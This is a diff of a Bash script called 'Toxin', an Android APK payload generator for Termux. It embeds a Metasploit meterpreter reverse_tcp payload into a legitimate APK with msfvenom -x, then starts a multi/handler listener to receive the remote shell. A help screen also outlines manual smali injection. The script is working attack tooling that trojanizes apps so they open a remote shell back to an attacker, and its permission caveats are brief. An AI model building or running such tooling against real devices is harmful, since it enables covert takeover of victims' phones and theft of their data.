@@ -1,173 +1,445 @@
 #!/bin/bash
 
-#Colors
- normal=$(echo -en "\e[0m")
- orange=$(echo -en "\e[33m")
- aqua=$(echo -en "\e[36m")
- lightgreen=$(echo -en "\e[92m")
+DEFAULT_PAYLOAD="android/meterpreter/reverse_tcp"
+OUTPUT_DIR="$HOME/storage/shared/toxin" # Requires termux-setup-storage
 
-function ascii() {
-echo "$aqua
+# === Colors ===
+normal=$(tput sgr0) # Use tput for better compatibility
+red=$(tput setaf 1)
+green=$(tput setaf 2)
+orange=$(tput setaf 3) # Yellow/Orange
+blue=$(tput setaf 4)
+aqua=$(tput setaf 6) # Cyan/Aqua
+bold=$(tput bold)
+
+# === Functions ===
+
+function display_error() {
+  echo "${bold}${red}[ERROR]${normal} ${red}$1${normal}" >&2
+}
+
+function display_warning() {
+  echo "${bold}${orange}[WARN]${normal} ${orange}$1${normal}"
+}
+
+function display_info() {
+  echo "${bold}${aqua}[INFO]${normal} ${aqua}$1${normal}"
+}
+
+function display_success() {
+  echo "${bold}${green}[SUCCESS]${normal} ${green}$1${normal}"
+}
+
+function ascii_art() {
+cat << "EOF"
+${aqua}
 _|_|_|_|_|    _|_|    _|      _|  _|_|_|  _|      _|
     _|      _|    _|    _|  _|      _|    _|_|    _|
     _|      _|    _|      _|        _|    _|  _|  _|
     _|      _|    _|    _|  _|      _|    _|    _|_|
-    _|        _|_|    _|      _|  _|_|_|  _|      _| 
-   
+    _|        _|_|    _|      _|  _|_|_|  _|      _|
+
    ----------- APK PAYLOAD GENERATOR -----------
                                     - By KSAURAJ
-$normal "
+${normal}
+EOF
+}
 
-}      
-function setup() {
-    ascii
-    pkg install nala git wget curl -y 
-    if ! command -v msfconsole &> /dev/null
-	then
-		echo "$orange Metasploit not found."
-        echo "Either install it manually or press 'Y' to continue."
-        echo "Do You want to install it? $normal"
-		read -rp "[?] Select [Y/n]> : " answer_1
-        clear
-            case "$answer_1" in
-                Y* | y*) echo "Installating metasploit."
-                wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
-                chmod +x metasploit.sh
-                ./metasploit.sh
-                rm metasploit.sh            
-                ;;
-            esac
-            
-	else
-        echo "Metasploit already present, skipping reinstallation."
+# Check if a command exists
+function command_exists() {
+  command -v "$1" &> /dev/null
+}
+
+# Request storage permission if not already set up
+function check_storage_permission() {
+    if [ ! -d "$HOME/storage/shared" ]; then
+        display_warning "Shared storage access not detected."
+        display_info "Requesting storage permission..."
+        termux-setup-storage
+        # Give some time for the user to grant permission
+        sleep 3
+        if [ ! -d "$HOME/storage/shared" ]; then
+            display_error "Storage permission not granted or failed. Output directory cannot be created."
+            display_error "Please grant storage permission manually via Android settings and restart the script."
+            exit 1
+        fi
+        display_success "Storage access seems configured."
     fi
+    # Ensure output directory exists
+    mkdir -p "$OUTPUT_DIR"
+    if [ ! -d "$OUTPUT_DIR" ]; then
+        display_error "Failed to create output directory: $OUTPUT_DIR"
+        display_error "Check permissions or storage space."
+        exit 1
+    fi
+}
 
-    clear
-    ascii
-    nala install apktool aapt openjdk-17 apksigner -y || git clone https://github.com/OnlineHacKing/TermuxTools-Installation && cd TermuxTools-Installation/Apktool-Termux && dpkg -i apktool_2.3.4_all.deb && cd ../.. && rm -rf TermuxTools-Installation
+# Install required packages using apt
+function install_packages() {
+  local missing_pkgs=()
+  local pkgs_to_check=("git" "wget" "curl" "coreutils" "openjdk-17" "aapt" "apktool" "apksigner")
+
+  display_info "Checking required packages..."
+  for pkg in "${pkgs_to_check[@]}"; do
+    if ! command_exists "$pkg"; then
+      # Special check for openjdk-17 as command might differ
+      if [[ "$pkg" == "openjdk-17" ]] && ! command_exists "java"; then
+         missing_pkgs+=("$pkg")
+      elif [[ "$pkg" != "openjdk-17" ]]; then
+         missing_pkgs+=("$pkg")
+      fi
+    fi
+  done
+
+  if [ ${#missing_pkgs[@]} -gt 0 ]; then
+    display_warning "Missing packages: ${missing_pkgs[*]}"
+    display_info "Attempting to install missing packages..."
+    pkg update -y || { display_error "pkg update failed."; return 1; }
+    pkg install "${missing_pkgs[@]}" -y || { display_error "Failed to install packages: ${missing_pkgs[*]}. Please install them manually."; return 1; }
+    display_success "Required packages installed."
+  else
+    display_success "All required packages are already installed."
+  fi
+  return 0
 }
-#function lhost
-function get_lhost()
-{
-    clear
-    ascii
-    echo ""
-  	read -rp "Enter LHOST : " LHOST
-}
-#function lport
-function get_lport()
-{
-    clear
-    ascii
-    echo ""
-    read -rp "Enter LPORT : " LPORT
-}
-#function payload
-function get_payload()
-{
-    PAYLOAD="android/meterpreter/reverse_tcp"
-}
-function modded_apk()
-{
-    clear
-    ascii
-    echo ""
-    read -rp "Enter Modded Apk Name : " mod_apk
-}
-#function original apk
-function original_apk()
-{
-    clear
-    ascii
-    echo ""
-    read -rp "Enter Original apk path : " orig_apk
-}
-function gen_payload() {
-    clear
-    ascii
-    echo "$green"
-    echo "Starting Metasploit, might take some time. $normal"
-    msfvenom -x $orig_apk -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $mod_apk
-    if [ -e "$mod_apk" ]
-    then
-        clear
-        ascii
-        mkdir -p ~/storage/shared/toxin
-        mv $mod_apk ~/storage/shared/toxin
-        echo ""
-        echo "$aqua Your apk was stored at /storage/emulated/0/toxin/$mod_apk $normal"
+
+# Install Metasploit Framework using the recommended Termux method
+function install_metasploit() {
+  if command_exists msfconsole; then
+    display_success "Metasploit Framework is already installed."
+    return 0
+  fi
+
+  display_warning "Metasploit Framework not found."
+  read -rp "${orange}[?] Do you want to attempt installation? (This can take a while) [Y/n]: ${normal}" answer
+  if [[ "$answer" =~ ^[Yy]$ ]] || [[ -z "$answer" ]]; then
+    display_info "Installing Metasploit..."
+    # The recommended method can change, this is common as of late 2023/early 2024
+    # Using unstable-repo is often required.
+    pkg install unstable-repo -y || { display_error "Failed to install unstable-repo."; return 1; }
+    pkg install metasploit -y || { display_error "Failed to install metasploit. Check Termux documentation for the latest method."; return 1; }
+
+    if command_exists msfconsole; then
+      display_success "Metasploit Framework installed successfully."
+      return 0
     else
-        echo "$orange Try with different apk. This apk looks sus.$normal"
+      display_error "Metasploit installation command finished, but msfconsole not found. Installation may have failed."
+      return 1
     fi
-}
-function listener_lhost()
-{
-    clear
-    ascii
-    echo ""
-  	read -rp "Enter LHOST : " l_host
-}
-#function lport
-function listener_lport()
-{
-    clear
-    ascii
-    echo ""
-    read -rp "Enter LPORT : " l_port
-}
-function start_handler() {
-    listener_lhost
-    listener_lport
-    clear
-    ascii
-    echo "$green"
-    echo "Starting Metasploit, might take some time. $normal"
-    msfconsole -x "use multi/handler; set LHOST $l_host ; set LPORT $l_port ; set PAYLOAD $PAYLOAD ; exploit"
-}
-function update()
-{
-curl -s https://raw.githubusercontent.com/ksauraj/toxin/master/toxin -o toxin
-rm $PREFIX/bin/toxin
-mv toxin $PREFIX/bin 
-chmod +x $PREFIX/bin/toxin
-exit 0
-}
-function main() {
-    clear
-    ascii
-    echo "  
-    [1] - Generate Payload
-    [2] - Start Listener
-    [3] - Start Setup
-    [4] - Update tool
-    [q] - Quit"
-    echo ""
-    read -rp "    [?] Select : " answer
-    clear
-        case "$answer" in
-            1*) 
-                ascii
-                get_lhost
-                get_lport
-                original_apk
-                modded_apk
-                gen_payload
-            ;;
-            2*)
-                ascii
-                start_handler
-            ;;
-            3*)
-                setup
-            ;;
-            4*)
-                update
-            ;;
-            q*)
-                echo -e $aqua " Good Bye !!"
-                exit 0
-            ;;
-        esac
+  else
+    display_warning "Skipping Metasploit installation."
+    return 1 # Indicate failure/skip
+  fi
 }
 
-main
+# Run the full setup process
+function run_setup() {
+  ascii_art
+  display_info "Starting setup process..."
+
+  check_storage_permission # Check this early
+
+  install_packages || { display_error "Package installation failed. Cannot continue."; exit 1; }
+  install_metasploit || { display_warning "Metasploit setup skipped or failed. Payload generation/listening might not work."; }
+
+  display_success "Setup process completed. Some steps might require manual intervention if errors occurred."
+  echo ""
+  read -rp "Press Enter to return to the main menu..."
+}
+
+# Get LHOST from user
+function get_lhost() {
+  local lhost_val=""
+  while [ -z "$lhost_val" ]; do
+    read -rp "${aqua}[?] Enter LHOST (Your IP Address): ${normal}" lhost_val
+    if [ -z "$lhost_val" ]; then
+      display_warning "LHOST cannot be empty."
+    fi
+    # Basic validation (not foolproof)
+    # if ! [[ "$lhost_val" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && ! [[ "$lhost_val" =~ ^[a-zA-Z0-9.-]+$ ]]; then
+    #   display_warning "Invalid LHOST format. Enter an IP address or hostname."
+    #   lhost_val=""
+    # fi
+  done
+  echo "$lhost_val"
+}
+
+# Get LPORT from user
+function get_lport() {
+  local lport_val=""
+  while true; do
+    read -rp "${aqua}[?] Enter LPORT (e.g., 4444): ${normal}" lport_val
+    if [[ "$lport_val" =~ ^[0-9]+$ ]] && [ "$lport_val" -gt 0 ] && [ "$lport_val" -le 65535 ]; then
+      break
+    else
+      display_warning "Invalid LPORT. Please enter a number between 1 and 65535."
+    fi
+  done
+  echo "$lport_val"
+}
+
+# Get Original APK path from user
+function get_original_apk() {
+  local apk_path=""
+  while true; do
+    # Use read -e for path autocompletion if available
+    read -e -rp "${aqua}[?] Enter path to ORIGINAL APK file: ${normal}" apk_path
+    # Expand ~ to home directory
+    apk_path="${apk_path/#\~/$HOME}"
+    if [ -z "$apk_path" ]; then
+      display_warning "APK path cannot be empty."
+    elif [ ! -f "$apk_path" ]; then
+      display_warning "File not found: $apk_path"
+    elif [[ "${apk_path##*.}" != "apk" ]]; then
+       display_warning "File does not seem to be an APK (extension is not .apk)."
+    else
+      break
+    fi
+  done
+  echo "$apk_path"
+}
+
+# Get desired output APK name
+function get_output_apk_name() {
+  local output_name=""
+  while [ -z "$output_name" ]; do
+    read -rp "${aqua}[?] Enter desired name for the OUTPUT APK (e.g., modified_app.apk): ${normal}" output_name
+    if [ -z "$output_name" ]; then
+      display_warning "Output name cannot be empty."
+    elif [[ "$output_name" != *.apk ]]; then
+       # Append .apk if missing
+       output_name="${output_name}.apk"
+       display_info "Appending .apk extension. Output name: $output_name"
+    fi
+  done
+  echo "$output_name"
+}
+
+# Generate payload using msfvenom -x (with warnings)
+function generate_payload() {
+  local lhost=$1
+  local lport=$2
+  local original_apk=$3
+  local output_apk_name=$4
+  local payload_type=$DEFAULT_PAYLOAD # Use the default for now
+  local output_path="$OUTPUT_DIR/$output_apk_name"
+
+  clear
+  ascii_art
+  display_info "Payload Type: $payload_type"
+  display_info "LHOST: $lhost"
+  display_info "LPORT: $lport"
+  display_info "Original APK: $original_apk"
+  display_info "Output Path: $output_path"
+  echo ""
+  display_warning "Using 'msfvenom -x' to embed the payload."
+  display_warning "This method is often UNRELIABLE with modern apps and may fail or create a non-functional APK."
+  display_warning "Consider manual decompilation/injection/recompilation for better results."
+  echo ""
+  read -rp "${orange}[?] Continue with this method? [Y/n]: ${normal}" confirm
+  if [[ "$confirm" =~ ^[Nn]$ ]]; then
+      display_info "Payload generation cancelled."
+      return 1
+  fi
+
+  display_info "Starting Metasploit (msfvenom)... this might take some time."
+
+  # Execute msfvenom and capture exit status
+  msfvenom -x "$original_apk" -p "$payload_type" LHOST="$lhost" LPORT="$lport" -o "$output_path"
+  local exit_status=$?
+
+  echo ""
+  if [ $exit_status -eq 0 ] && [ -f "$output_path" ] && [ -s "$output_path" ]; then
+    # Check if file exists and is not empty
+    display_success "Payload generation command finished successfully."
+    display_success "Modified APK saved to: $output_path"
+    display_info "Remember to sign the APK if needed, although msfvenom often handles basic signing."
+    display_warning "Test the generated APK thoroughly!"
+  else
+    display_error "Payload generation FAILED (msfvenom exit status: $exit_status)."
+    if [ -f "$output_path" ]; then
+        display_warning "An output file was created but might be corrupted or empty."
+        # Optionally remove the failed attempt: rm "$output_path"
+    fi
+    display_error "Possible reasons: Incompatible original APK, anti-tampering mechanisms, incorrect LHOST/LPORT, Metasploit issue."
+    display_error "Try a different (simpler, older) original APK or use manual methods."
+    return 1
+  fi
+  return 0
+}
+
+# Start Metasploit listener
+function start_listener() {
+  local lhost=$1
+  local lport=$2
+  local payload_type=$DEFAULT_PAYLOAD # Use the default
+
+  clear
+  ascii_art
+  display_info "Starting Metasploit listener (msfconsole)..."
+  display_info "Payload: $payload_type"
+  display_info "LHOST: $lhost"
+  display_info "LPORT: $lport"
+  echo ""
+  display_info "Waiting for incoming connection..."
+
+  # Check if msfconsole exists
+  if ! command_exists msfconsole; then
+      display_error "msfconsole command not found. Please run setup (option 3) or install Metasploit manually."
+      return 1
+  fi
+
+  msfconsole -q -x "use multi/handler; set PAYLOAD $payload_type; set LHOST $lhost; set LPORT $lport; exploit -j -z"
+  # -q quiet start
+  # -j run as job
+  # -z don't interact after session established (optional, keeps handler running)
+
+  local exit_status=$?
+  if [ $exit_status -ne 0 ]; then
+      display_error "msfconsole exited with an error (status: $exit_status)."
+  fi
+  display_info "Listener stopped."
+}
+
+# Update the script from GitHub
+function update_script() {
+  display_info "Attempting to update Toxin from GitHub..."
+  local script_path="$PREFIX/bin/toxin"
+  local temp_script="/data/data/com.termux/files/usr/tmp/toxin.tmp"
+  local repo_url="https://raw.githubusercontent.com/ksauraj/toxin/master/toxin"
+
+  # Download the latest version
+  if curl -fsSL "$repo_url" -o "$temp_script"; then
+    # Compare the downloaded script with the current one
+    if cmp -s "$script_path" "$temp_script"; then
+      display_success "You already have the latest version."
+      rm "$temp_script"
+    else
+      display_info "New version found. Installing..."
+      # Make the temp script executable (needed for potential self-execution if update logic changes)
+      chmod +x "$temp_script"
+      # Replace the old script
+      if mv "$temp_script" "$script_path"; then
+        display_success "Toxin updated successfully. Please restart the script."
+        exit 0 # Exit after successful update
+      else
+        display_error "Failed to replace the old script file. Check permissions."
+        rm "$temp_script" # Clean up temp file on failure
+        return 1
+      fi
+    fi
+  else
+    display_error "Failed to download the update. Check your internet connection or the repository URL."
+    # Clean up temp file if it exists from a partial download
+    [ -f "$temp_script" ] && rm "$temp_script"
+    return 1
+  fi
+}
+
+# Display information about compatible APKs
+function apk_compatibility_info() {
+    clear
+    ascii_art
+    echo "${bold}${orange}--- APK Compatibility Information ---${normal}"
+    echo ""
+    echo "${orange}The payload injection method used by this script ('msfvenom -x') directly patches the APK.${normal}"
+    echo "${orange}This method often ${bold}FAILS${orange} with modern Android applications due to:${normal}"
+    echo "  - ${bold}Code Obfuscation/Shrinking:${normal} Tools like ProGuard/R8 rename classes/methods, breaking the patch."
+    echo "  - ${bold}Anti-Tamper Checks:${normal} Apps verifying their own signature or code integrity."
+    echo "  - ${bold}Complex Frameworks:${normal} Apps built with React Native, Flutter, Xamarin, etc."
+    echo "  - ${bold}Split APKs / App Bundles:${normal} Apps installed in multiple parts."
+    echo ""
+    echo "${green}APKs that are ${bold}MORE LIKELY*${green} to work:${normal}"
+    echo "  - ${bold}Older applications:${normal} Especially those targeting older Android versions."
+    echo "  - ${bold}Simple applications:${normal} Apps with basic functionality, minimal libraries."
+    echo "  - ${bold}Debug builds:${normal} If you have access to a non-release version."
+    echo "  - ${bold}Apps you developed yourself:${normal} For testing purposes, build a simple 'Hello World' app."
+    echo ""
+    echo "${orange}*There is ${bold}NO GUARANTEE${orange} any specific APK will work.${normal}"
+    echo "${orange}Finding publicly available, simple, older APKs for testing can be difficult and legally questionable.${normal}"
+    echo "${orange}It's highly recommended to test on an app you have permission to modify (like one you built).${normal}"
+    echo ""
+    echo "${aqua}For more reliable results, research manual APK modification:${normal}"
+    echo "  1. Decompile the APK: ${bold}apktool d app.apk${normal}"
+    echo "  2. Generate raw payload: ${bold}msfvenom -p android/... -f raw -o payload.smali${normal}"
+    echo "  3. Inject payload code (smali) into the decompiled source (requires knowledge of smali & Android)."
+    echo "  4. Recompile the APK: ${bold}apktool b app -o new_app.apk${normal}"
+    echo "  5. Sign the new APK: ${bold}apksigner sign ... new_app.apk${normal}"
+    echo ""
+    read -rp "Press Enter to return to the main menu..."
+}
+
+
+# Main menu function
+function main_menu() {
+  while true; do
+    clear
+    ascii_art
+    echo "  ${bold}Select an option:${normal}"
+    echo "    [1] Generate Payload (Embed in existing APK)"
+    echo "    [2] Start Metasploit Listener"
+    echo "    [3] Run Full Setup / Install Dependencies"
+    echo "    [4] Check for Toxin Updates"
+    echo "    [5] APK Compatibility Info & Manual Method Overview"
+    echo "    [q] Quit"
+    echo ""
+    read -rp "    ${aqua}[?] Select : ${normal}" answer
+
+    case "$answer" in
+      1)
+        local lhost=$(get_lhost)
+        local lport=$(get_lport)
+        local orig_apk=$(get_original_apk)
+        local mod_apk_name=$(get_output_apk_name)
+        generate_payload "$lhost" "$lport" "$orig_apk" "$mod_apk_name"
+        read -rp "Press Enter to return to the main menu..."
+        ;;
+      2)
+        local lhost=$(get_lhost)
+        local lport=$(get_lport)
+        start_listener "$lhost" "$lport"
+        read -rp "Press Enter to return to the main menu..."
+        ;;
+      3)
+        run_setup
+        ;;
+      4)
+        update_script
+        read -rp "Press Enter to return to the main menu..."
+        ;;
+      5)
+        apk_compatibility_info
+        ;;
+      q | Q)
+        echo ""
+        display_info "Exiting Toxin. Goodbye!"
+        exit 0
+        ;;
+      *)
+        display_warning "Invalid option selected."
+        sleep 1
+        ;;
+    esac
+  done
+}
+
+# --- Script Entry Point ---
+# Check if running in Termux
+if [ -z "$PREFIX" ]; then
+    display_error "This script is designed to run within Termux."
+    exit 1
+fi
+
+# Ensure coreutils is available for tput
+if ! command_exists tput; then
+    echo "[ERROR] 'tput' command not found. Trying to install 'ncurses-utils'..."
+    pkg install ncurses-utils -y || { echo "[ERROR] Failed to install ncurses-utils. Cannot proceed."; exit 1; }
+    # Re-source colors if needed, though script restart is safer
+fi
+
+
+# Initial check for storage permission before main menu
+check_storage_permission
+
+# Start the main menu
+main_menu
